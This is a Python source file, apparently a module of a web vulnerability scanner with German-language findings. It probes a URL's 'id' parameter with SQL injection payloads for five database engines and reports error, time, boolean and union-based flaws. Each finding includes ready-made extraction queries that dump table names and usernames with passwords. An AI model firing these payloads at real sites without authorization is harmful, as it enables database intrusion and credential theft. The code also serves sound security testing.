#!/usr/bin/env python3
"""
SQLMap Scanner Module - Advanced SQL Injection Detection
Comprehensive Python fallback with error/boolean/time/union-based detection
Shows extraction examples for each SQLi type found
"""
import requests
import re
import time

SQLI_PAYLOADS = {
    'mysql': {
        'error': ["'", "'--", "' AND 1=1", "' AND 1=2", "' OR '1'='1", "' UNION SELECT NULL--",
                  "' UNION SELECT NULL,NULL--", "' AND EXTRACTVALUE(1, CONCAT(0x7e, @@version))--"],
        'time': ["' AND SLEEP(3)--", "1' AND SLEEP(3)--", "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
                 "' AND IF(1=1, SLEEP(3), 0)--", "' AND BENCHMARK(3000000, MD5(1))--"],
        'union': ["' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--",
                  "' UNION SELECT 1,@@version,3--", "' UNION SELECT 1,database(),3--"],
        'boolean': ["' AND 1=1--", "' AND 1=2--", "' AND '1'='1", "' AND '1'='2",
                    "1' AND 1=1--", "1' AND 1=2--"],
    },
    'postgresql': {
        'error': ["'", "'--", "' AND 1=1", "' AND 1=2", "'; SELECT version()--",
                  "' AND 1=CAST((SELECT version()) AS INTEGER)--"],
        'time': ["' AND pg_sleep(3)--", "1' AND pg_sleep(3)--", "'; SELECT pg_sleep(3)--"],
        'union': ["' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT version(),NULL--"],
        'boolean': ["' AND 1=1--", "' AND 1=2--", "' AND LENGTH(current_database())>0--"],
    },
    'mssql': {
        'error': ["'", "'--", "' AND 1=1", "'; SELECT @@VERSION--",
                  "' AND 1=CONVERT(int, @@VERSION)--"],
        'time': ["'; WAITFOR DELAY '0:0:3'--", "'; IF (1=1) WAITFOR DELAY '0:0:3'--"],
        'union': ["' UNION SELECT NULL,NULL--", "' UNION SELECT @@VERSION,NULL--"],
        'boolean': ["' AND 1=1--", "' AND 1=2--", "' AND LEN(DB_NAME())>0--"],
    },
    'oracle': {
        'error': ["'", "' UNION SELECT NULL FROM DUAL--", "' UNION SELECT NULL,NULL FROM DUAL--",
                  "'||(SELECT '' FROM dual WHERE 1=1)||'"],
        'time': ["'||DBMS_PIPE.RECEIVE_MESSAGE(('a'),3)||'",
                  "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(('a'),3)--"],
        'union': ["' UNION SELECT NULL FROM DUAL--", "' UNION SELECT banner,NULL FROM v$version--"],
        'boolean': ["' AND '1'='1", "' AND '1'='2", "'||(SELECT '' FROM dual WHERE 1=1)||'"],
    },
    'sqlite': {
        'error': ["'", "' UNION SELECT NULL--", "' UNION SELECT sqlite_version(),NULL--",
                  "' AND 1=randomblob(1000000000)--"],
        'time': ["' AND randomblob(300000000)--"],
        'union': ["' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT sqlite_version(),NULL--"],
        'boolean': ["' AND 1=1--", "' AND 1=2--"],
    },
}

EXTRACTION_EXAMPLES = {
    'mysql': [
        "' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--  → DB-Version",
        "' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--  → DB-Name",
        "' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))--  → ALLE Tabellen",
        "' AND extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'),0x7e))--  → Spalten von 'users'",
        "' AND extractvalue(1,concat(0x7e,(SELECT group_concat(username,':',password) FROM users),0x7e))--  → User+Passwoerter!",
    ],
    'postgresql': [
        "' AND 1=cast((SELECT version()) as integer)--  → DB-Version",
        "' AND 1=cast((SELECT current_database()) as integer)--  → DB-Name",
        "' AND 1=cast((SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public') as integer)--  → Tabellen",
    ],
    'mssql': [
        "' AND 1=@@version--  → DB-Version",
        "' AND 1=DB_NAME()--  → DB-Name",
        "'; SELECT table_name FROM information_schema.tables FOR XML PATH('')--  → Tabellen",
    ],
    'oracle': [
        "' OR 1=utl_inaddr.get_host_name((SELECT banner FROM v$version WHERE ROWNUM=1))--  → DB-Version",
        "' AND 1=(SELECT COUNT(*) FROM user_tables)--  → Tabellen-Anzahl",
        "' UNION SELECT NULL,table_name,NULL FROM user_tables--  → Tabellennamen",
    ],
    'sqlite': [
        "' AND sqlite_version()--  → DB-Version",
        "' UNION SELECT sql,NULL FROM sqlite_master WHERE type='table'--  → Tabellendefinitionen",
        "' UNION SELECT group_concat(name),NULL FROM sqlite_master WHERE type='table'--  → Tabellennamen",
    ],
}


def _send(target, payload, param='id'):
    try:
        url = f'{target}?{param}={requests.utils.quote(payload)}'
        start = time.time()
        resp = requests.get(url, timeout=20, verify=False, allow_redirects=False,
                           headers={'User-Agent': 'Mozilla/5.0 (SecurityScan/3.3)'})
        return {'status': resp.status_code, 'size': len(resp.content), 'time': time.time() - start,
                'text': resp.text[:3000]}
    except requests.exceptions.Timeout:
        return {'status': -1, 'size': -1, 'time': 20, 'timeout': True}
    except Exception as e:
        return {'status': 0, 'size': 0, 'time': 0, 'error': str(e)}


def _detect_db(target):
    test_payloads = {
        'mysql': ("'", ['mysql', 'mariadb', 'sql syntax']),
        'postgresql': ("'", ['postgresql', 'pg_query']),
        'mssql': ("'", ['mssql', 'sql server', 'odbc']),
        'oracle': ("'", ['ora-', 'oracle', 'pl/sql']),
        'sqlite': ("'", ['sqlite', 'sqlite3']),
    }
    try:
        session = requests.Session()
        session.headers.update({'User-Agent': 'Mozilla/5.0'})
        for db_type, (payload, indicators) in test_payloads.items():
            try:
                url = f'{target}?id={requests.utils.quote(payload)}'
                resp = session.get(url, timeout=15, verify=False)
                content = resp.text.lower()
                for indicator in indicators:
                    if indicator in content:
                        return db_type
            except:
                continue
    except:
        pass
    return 'mysql'


def scan(target):
    findings = []
    scan_id = 0
    if not target.startswith('http'):
        target = f'https://{target}'
    print(f"[PHASE SQLMAP] Scanning {target}")

    db_type = _detect_db(target)
    baseline = _send(target, '1')
    if baseline.get('error'):
        findings.append({'id': f'sqlm-{scan_id}', 'severity': 'info', 'type': 'sqlmap_error',
                         'title': 'SQLMap: Baseline failed', 'url': target,
                         'evidence': str(baseline['error']), 'remediation': 'Check target URL.'})
        return findings

    payloads = SQLI_PAYLOADS.get(db_type, SQLI_PAYLOADS['mysql'])
    examples = EXTRACTION_EXAMPLES.get(db_type, EXTRACTION_EXAMPLES['mysql'])

    # Error-based
    error_findings = []
    error_indicators = [r'sql syntax', r'near', r'error in your sql', r'ORA-\d+', r'mysql_fetch',
                        r'pg_query', r'sql server', r'unterminated.*quote', r'incorrect syntax']
    for payload in payloads['error'][:15]:
        resp = _send(target, payload)
        text_lower = resp.get('text', '').lower()
        for indicator in error_indicators:
            if re.search(indicator, text_lower, re.IGNORECASE):
                error_findings.append({'payload': payload, 'indicator': indicator, 'db_type': db_type})
                break

    if error_findings:
        best = error_findings[0]
        findings.append({
            'id': f'sqlm-{scan_id}', 'severity': 'critical', 'type': 'sqlmap_error_based',
            'title': f'[SQLMap] Error-Based SQL Injection ({db_type.upper()}) - DATEN AUSLESBAR!',
            'url': f'{target}?id=',
            'evidence': (
                f'=== Error-Based SQLi BESTATIGT - DATEN AUSLESBAR! ===\n\n'
                f'Datenbank: {db_type.upper()}\n'
                f'Payload: id={best["payload"]}\n'
                f'Fehler: {best["indicator"]}\n\n'
                f'=== BEISPIELE zum Daten auslesen: ===\n'
                + '\n'.join(f'  {ex}' for ex in examples) +
                f'\n\n'
                f'Mit Error-Based kann man via Fehlermeldungen\n'
                f'die KOMPLETTE Datenbank auslesen - Buchstabe fuer Buchstabe!'
            ),
            'remediation': 'SOFORT Prepared Statements! Error-Display in Production DEAKTIVIEREN!'
        })
        scan_id += 1

    # Time-based
    time_findings = []
    for payload in payloads['time'][:8]:
        n_start = time.time()
        try: requests.get(f'{target}?id=1', timeout=10, verify=False)
        except: pass
        n_time = time.time() - n_start

        p_start = time.time()
        try: requests.get(f'{target}?id={requests.utils.quote(payload)}', timeout=15, verify=False)
        except: pass
        p_time = time.time() - p_start

        delay = p_time - n_time
        if delay >= 2.0:
            time_findings.append({'delay': round(delay, 2), 'payload': payload, 'db_type': db_type})

    if time_findings:
        best = max(time_findings, key=lambda x: x['delay'])
        findings.append({
            'id': f'sqlm-{scan_id}', 'severity': 'critical', 'type': 'sqlmap_time_based',
            'title': f'[SQLMap] Time-Based Blind SQLi ({db_type.upper()}) - DATEN AUSLESBAR!',
            'url': f'{target}?id=',
            'evidence': (
                f'=== Time-Based Blind SQLi BESTATIGT - DATEN AUSLESBAR! ===\n\n'
                f'Normal: ~{n_time:.1f}s | Mit Payload: ~{p_time:.1f}s\n'
                f'DELAY: {best["delay"]} SEKUNDEN!\n'
                f'Payload: id={best["payload"]}\n\n'
                f'=== Time-Based Daten-Extraktion (Buchstabe fuer Buchstabe): ===\n'
                f"  ' AND IF(ASCII(SUBSTRING((SELECT version()),1,1))>64,SLEEP(3),0)--\n"
                f"    → Erster Buchstabe der Version > 'A'?\n"
                f"  ' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64,SLEEP(3),0)--\n"
                f"    → Erster Buchstabe des Passworts > 'A'?\n"
                f"  ' AND IF((SELECT COUNT(*) FROM information_schema.tables)>10,SLEEP(3),0)--\n"
                f"    → Mehr als 10 Tabellen?\n\n"
                f"Mit Time-Based kann man via Zeitverzoegerung\n"
                f"die KOMPLETTE Datenbank bit fuer bit auslesen!\n"
                f"Langsam aber 100% zuverlaessig!"
            ),
            'remediation': 'SOFORT Prepared Statements! Alle User-Inputs parametrisieren!'
        })
        scan_id += 1

    # Boolean-based
    bool_pairs = []
    for i in range(0, len(payloads['boolean']) - 1, 2):
        if i + 1 < len(payloads['boolean']):
            bool_pairs.append((payloads['boolean'][i], payloads['boolean'][i + 1]))

    boolean_findings = []
    for true_p, false_p in bool_pairs[:6]:
        t_resp = _send(target, true_p)
        f_resp = _send(target, false_p)
        if abs(t_resp['size'] - f_resp['size']) > max(baseline['size'] * 0.05, 300):
            boolean_findings.append({'true_p': true_p, 'false_p': false_p, 'diff': abs(t_resp['size'] - f_resp['size'])})

    if boolean_findings:
        best = boolean_findings[0]
        findings.append({
            'id': f'sqlm-{scan_id}', 'severity': 'critical', 'type': 'sqlmap_boolean_based',
            'title': f'[SQLMap] Boolean-Based Blind SQLi ({db_type.upper()}) - DATEN AUSLESBAR!',
            'url': f'{target}?id=',
            'evidence': (
                f'=== Boolean-Based Blind SQLi BESTATIGT - DATEN AUSLESBAR! ===\n\n'
                f'TRUE:  id={best["true_p"]}\n'
                f'FALSE: id={best["false_p"]}\n'
                f'Unterschied: {best["diff"]} bytes\n\n'
                f'=== Boolean-Based Extraktion (Ja/Nein Fragen): ===\n'
                f"  ' AND ASCII(SUBSTRING((SELECT version()),1,1))>64--\n"
                f"    → Ist erster Buchstabe der Version > \"A\"?\n"
                f"  ' AND LENGTH((SELECT password FROM users LIMIT 1))>5--\n"
                f"    → Passwort laenger als 5 Zeichen?\n"
                f"  ' AND (SELECT COUNT(*) FROM information_schema.tables)>10--\n"
                f"    → Mehr als 10 Tabellen?\n\n"
                f"Mit Boolean-Based kann man via TRUE/FALSE Antworten\n"
                f"die KOMPLETTE Datenbank bit fuer bit auslesen!\n"
                f"Langsam aber sehr zuverlaessig!"
            ),
            'remediation': 'Prepared Statements + Input-Validierung SOFORT!'
        })
        scan_id += 1

    # Union-based
    union_findings = []
    for payload in payloads['union'][:6]:
        resp = _send(target, payload)
        if resp['status'] == baseline['status'] and abs(resp['size'] - baseline['size']) < max(baseline['size'] * 0.1, 500):
            if resp['size'] > 100:
                union_findings.append({'payload': payload, 'columns': payload.count('NULL')})

    if union_findings:
        best = union_findings[0]
        cols = best["columns"]
        union_extract = []
        if cols >= 1:
            union_extract.append(f"' UNION SELECT {'NULL,' * (cols-1)}version()--  → DB-Version")
        if cols >= 2:
            union_extract.append(f"' UNION SELECT {'NULL,' * (cols-2)}user(),database()--  → User + DB")
        if cols >= 3:
            union_extract.append(f"' UNION SELECT {'NULL,' * (cols-3)}table_name,column_name FROM information_schema.columns WHERE table_schema=database() LIMIT 1--  → Spalten")
        if cols >= 4:
            union_extract.append(f"' UNION SELECT {'NULL,' * (cols-4)}id,username,password FROM users LIMIT 1--  → User-Daten!")

        findings.append({
            'id': f'sqlm-{scan_id}', 'severity': 'critical', 'type': 'sqlmap_union_based',
            'title': f'[SQLMap] UNION SQLi ({cols} Spalten, {db_type.upper()}) - DIREKTER DATENZUGRIFF!',
            'url': f'{target}?id=',
            'evidence': (
                f'=== UNION SQLi BESTATIGT - DIREKTER DATENZUGRIFF! ===\n\n'
                f'UNION SELECT mit {cols} Spalten wird AKZEPTIERT!\n'
                f'Payload: id={best["payload"]}\n\n'
                f'=== BEISPIELE zum direkten Auslesen: ===\n'
                + '\n'.join(f'  {ex}' for ex in union_extract) +
                f'\n\n'
                f'=== KOMPLETTER Daten-Dump: ===\n'
                f"  ' UNION SELECT {'NULL,' * (cols-1)}group_concat(username,':',password) FROM users--\n"
                f'  → ALLE Usernamen + Passwoerter auf einmal!\n\n'
                f'UNION ist die SCHNELLSTE SQLi-Methode!\n'
                f'Direkter Zugriff auf ALLE Datenbank-Inhalte!'
            ),
            'remediation': 'SOFORT Prepared Statements! NIEMALS User-Input in Queries!'
        })
        scan_id += 1

    # Summary
    if not findings:
        findings.append({
            'id': f'sqlm-{scan_id}', 'severity': 'info', 'type': 'sqlmap_clean',
            'title': f'SQLMap: Keine SQL Injection ({db_type})',
            'url': target,
            'evidence': f'Error: {len(error_findings)}, Time: {len(time_findings)}, Boolean: {len(boolean_findings)}, Union: {len(union_findings)}',
            'remediation': 'Trotzdem Prepared Statements verwenden.'
        })
    else:
        findings.insert(0, {
            'id': f'sqlm-{scan_id}', 'severity': 'critical', 'type': 'sqlmap_summary',
            'title': f'[SQLMap] SQL Injection BESTATIGT via {len(findings)} Methoden!',
            'url': target,
            'evidence': (
                f'SQL INJECTION auf {db_type.upper()} nachweisbar!\n\n'
                f'Methoden:\n'
                f'- Error-Based: {"JA" if error_findings else "NEIN"}\n'
                f'- Time-Based: {"JA" if time_findings else "NEIN"}\n'
                f'- Boolean-Based: {"JA" if boolean_findings else "NEIN"}\n'
                f'- Union-Based: {"JA" if union_findings else "NEIN"}\n\n'
                f'ALLE Methoden ermoeglichen Daten-Auslesen!'
            ),
            'remediation': 'SOFORT patchen! Siehe Details bei jedem Finding!'
        })

    return findings
